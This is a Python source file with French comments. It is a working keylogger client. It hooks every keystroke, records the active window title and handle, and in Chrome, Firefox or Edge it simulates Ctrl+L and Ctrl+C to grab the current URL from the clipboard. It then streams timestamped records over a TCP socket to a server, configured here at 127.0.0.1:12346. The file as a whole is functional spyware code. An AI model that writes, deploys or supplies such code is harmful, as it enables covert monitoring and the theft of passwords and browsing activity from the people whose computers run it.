import socket
import threading
import keyboard
import pygetwindow as gw
import pyperclip
from datetime import datetime

# Configuration du serveur
HOST = '127.0.0.1'  # Adresse IP locale
PORT = 12346  # Port du serveur


def get_current_time():
    """Retourne la date et l'heure actuelles au format jour/mois/année heure:minute:seconde."""
    now = datetime.now()
    return now.strftime("%d/%m/%Y %H:%M:%S")

def connect_to_server():
    """Connexion au serveur pour envoyer les messages."""
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((HOST, PORT))
        print(f"Connecté au serveur {HOST}:{PORT}")
    except ConnectionRefusedError:
        print("Connexion au serveur échouée. Assurez-vous que le serveur est en cours d'exécution.")
        return None
    return client

def send_message_to_server(client, message):
    """Envoi des messages au serveur."""
    try:
        client.send(message.encode('utf-8'))
    except Exception as e:
        print(f"Erreur lors de l'envoi du message : {e}")

def on_key_event(event, client):
    """Gérer l'événement lorsque l'utilisateur appuie sur une touche."""
    if event.event_type == keyboard.KEY_DOWN:
        # Récupérer la fenêtre active
        active_window = gw.getActiveWindow()
        app_name = active_window.title if active_window else "Inconnu"
        app_class = active_window._hWnd if active_window else "Inconnu"

        # Obtenir l'URL ou le texte si c'est un explorateur ou un navigateur
        url_or_text = None
        if "Google Chrome" in app_name or "Firefox" in app_name or "Edge" in app_name:
            keyboard.press_and_release('ctrl+l')  # Aller à la barre d'URL
            keyboard.press_and_release('ctrl+c')  # Copier l'URL
            url_or_text = pyperclip.paste()

        # Créer le message à envoyer avec la date et l'heure
        timestamp = get_current_time()  # Récupérer l'heure actuelle
        message = f"[{timestamp}] Touche pressée : >> '{event.name}' << {app_name} (Class ID: {app_class})"
        if url_or_text:
            message += f"\nURL/Texte récupéré : {url_or_text}"

        # Envoi du message au serveur
        if client:
            send_message_to_server(client, message)

def main():
    # Connexion au serveur
    client = connect_to_server()
    if client:
        # Ecoute globale des événements de clavier
        keyboard.hook(lambda event: on_key_event(event, client))

        print("Appuyez sur une touche pour enregistrer et envoyer le message au serveur.")
        keyboard.wait()  # Attend indéfiniment pour les entrées

if __name__ == "__main__":
    main()
